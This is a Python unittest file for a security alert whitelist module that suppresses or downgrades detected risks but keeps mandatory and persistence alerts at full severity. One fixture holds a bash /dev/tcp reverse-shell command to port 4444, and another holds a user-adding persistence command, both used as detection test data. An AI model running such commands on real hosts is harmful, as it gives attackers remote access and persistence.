#!/usr/bin/env python3
"""Tests for risk-identification whitelist suppression."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

from whitelist import apply_whitelist, resolve_whitelist_config, whitelist_disabled  # noqa: E402


class TestWhitelistConfig(unittest.TestCase):
    def test_resolve_default_when_enabled(self) -> None:
        cfg = resolve_whitelist_config({})
        self.assertIsNotNone(cfg)
        self.assertTrue((cfg.get("defaults") or {}).get("enabled", True))

    def test_opt_out_via_payload(self) -> None:
        self.assertTrue(whitelist_disabled({"whitelist": {"enabled": False}}, {}))
        self.assertIsNone(resolve_whitelist_config({"whitelist": {"enabled": False}}))


class TestWhitelistSuppression(unittest.TestCase):
    def test_noise_rules_cannot_override_mandatory_policy(self):
        whitelist = {"rules": [{"id": "all", "action": "suppress"}]}
        for tier in ("hard_guardrail", "force_alert"):
            item = {"policy_tier": tier, "severity": "P0", "alert_required": True,
                    "original_risk": {"severity": "P1"}}
            items, hits = apply_whitelist([item], whitelist)
            self.assertEqual(items, [item])
            self.assertEqual(hits, [])

    def test_downgrade_synchronizes_delivery_and_preserves_policy_history(self):
        item = {"severity": "P0", "alert_required": True, "recommended_action": "isolate_host",
                "original_risk": {"severity": "P1"}}
        for severity in ("P2", "P3"):
            items, _ = apply_whitelist([item], {"rules": [{"id": "ops", "action": "downgrade", "target_severity": severity}]})
            self.assertFalse(items[0]["alert_required"])
            self.assertIn(items[0]["recommended_action"], {"observe", "log_only"})
            self.assertEqual(items[0]["original_risk"], item["original_risk"])
            self.assertEqual(items[0]["pre_whitelist_risk"]["severity"], "P0")

    def test_suppress_aliyun_metadata_curl(self) -> None:
        item = {
            "risk_id": "risk-1",
            "risk_module": "exec",
            "severity": "P0",
            "confidence": 0.85,
            "verdict": "confirmed_attack",
            "recommended_action": "isolate_host_and_investigate",
            "host": "ks-VMware-Virtual-Platform",
            "listener_port": "22",
            "listener_process": "sshd",
            "exe": "/usr/bin/curl",
            "command": '["curl","http://100.100.100.200/latest/meta-data/region-id","-sSfL"]',
            "matched_rules": ["download_and_execute"],
        }
        whitelist = {
            "defaults": {"enabled": True},
            "rules": [
                {
                    "id": "wl-aliyun-metadata-region-curl",
                    "scope": {
                        "risk_modules": ["exec"],
                        "matched_rules_any": ["download_and_execute"],
                        "listener_process": ["sshd"],
                        "listener_ports": [22],
                        "command_regex": "100\\.100\\.100\\.200/latest/meta-data/region-id",
                    },
                    "action": "suppress",
                    "target_severity": "P3",
                    "target_verdict": "benign",
                    "target_action": "log_only",
                    "reason": "阿里云 metadata region-id 查询白名单",
                }
            ],
        }
        items, hits = apply_whitelist([item], whitelist)
        self.assertEqual(len(hits), 1)
        self.assertTrue(items[0]["whitelisted"])
        self.assertTrue(items[0]["alert_suppressed"])
        self.assertFalse(items[0]["alert_required"])
        self.assertEqual(items[0]["severity"], "P3")
        self.assertEqual(items[0]["verdict"], "benign")
        self.assertEqual(items[0]["recommended_action"], "log_only")
        self.assertEqual(items[0]["original_risk"]["severity"], "P0")

    def test_no_match_keeps_item(self) -> None:
        item = {
            "risk_id": "risk-2",
            "risk_module": "exec",
            "severity": "P0",
            "listener_port": 80,
            "listener_process": "nginx",
            "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "matched_rules": ["reverse_shell"],
        }
        whitelist = {
            "defaults": {"enabled": True},
            "rules": [
                {
                    "id": "wl-aliyun-metadata-region-curl",
                    "scope": {"command_regex": "100\\.100\\.100\\.200/latest/meta-data/region-id"},
                    "action": "suppress",
                }
            ],
        }
        items, hits = apply_whitelist([item], whitelist)
        self.assertEqual(hits, [])
        self.assertNotIn("whitelisted", items[0])
        self.assertEqual(items[0]["severity"], "P0")


    def test_downgrade_sshd_interactive_noise(self) -> None:
        item = {
            "risk_id": "risk-3",
            "risk_module": "exec",
            "severity": "P0",
            "listener_port": 22,
            "listener_process": "sshd",
            "command": "bash -c id",
            "matched_rules": ["external_listener_shell_exec"],
        }
        whitelist = {
            "defaults": {"enabled": True},
            "rules": [
                {
                    "id": "wl-sshd-interactive-noise",
                    "scope": {
                        "risk_modules": ["exec"],
                        "listener_process": ["sshd"],
                        "listener_ports": [22],
                        "severity_at_or_above": "P1",
                    },
                    "action": "downgrade",
                    "target_severity": "P3",
                    "target_action": "log_only",
                }
            ],
        }
        items, hits = apply_whitelist([item], whitelist)
        self.assertEqual(len(hits), 1)
        self.assertEqual(items[0]["severity"], "P3")
        self.assertFalse(items[0]["alert_required"])

    def test_ops_exe_prefix_downgrade(self) -> None:
        item = {
            "risk_id": "risk-4",
            "risk_module": "exec",
            "severity": "P0",
            "exe": "/opt/ops/deploy.sh",
            "command": "/opt/ops/deploy.sh restart",
            "matched_rules": ["download_and_execute"],
        }
        whitelist = {
            "defaults": {"enabled": True},
            "rules": [
                {
                    "id": "wl-ops-exe-prefix",
                    "scope": {
                        "risk_modules": ["exec"],
                        "exe_prefixes": ["/opt/ops/"],
                        "severity_at_or_above": "P1",
                    },
                    "action": "downgrade",
                    "target_severity": "P2",
                }
            ],
        }
        items, hits = apply_whitelist([item], whitelist)
        self.assertEqual(items[0]["severity"], "P2")
        self.assertEqual(len(hits), 1)


    def test_sshd_persistence_not_downgraded(self) -> None:
        item = {
            "risk_id": "risk-5",
            "risk_module": "exec",
            "severity": "P0",
            "listener_port": 22,
            "listener_process": "sshd",
            "command": "bash -c sudo useradd devops",
            "matched_rules": ["persistence_modify"],
        }
        whitelist = {
            "defaults": {"enabled": True},
            "rules": [
                {
                    "id": "wl-sshd-interactive-noise",
                    "scope": {
                        "risk_modules": ["exec"],
                        "listener_process": ["sshd"],
                        "listener_ports": [22],
                        "severity_at_or_above": "P1",
                        "exclude_matched_rules_any": ["persistence_modify"],
                    },
                    "action": "downgrade",
                    "target_severity": "P3",
                }
            ],
        }
        items, hits = apply_whitelist([item], whitelist)
        self.assertEqual(hits, [])
        self.assertEqual(items[0]["severity"], "P0")


if __name__ == "__main__":
    unittest.main()
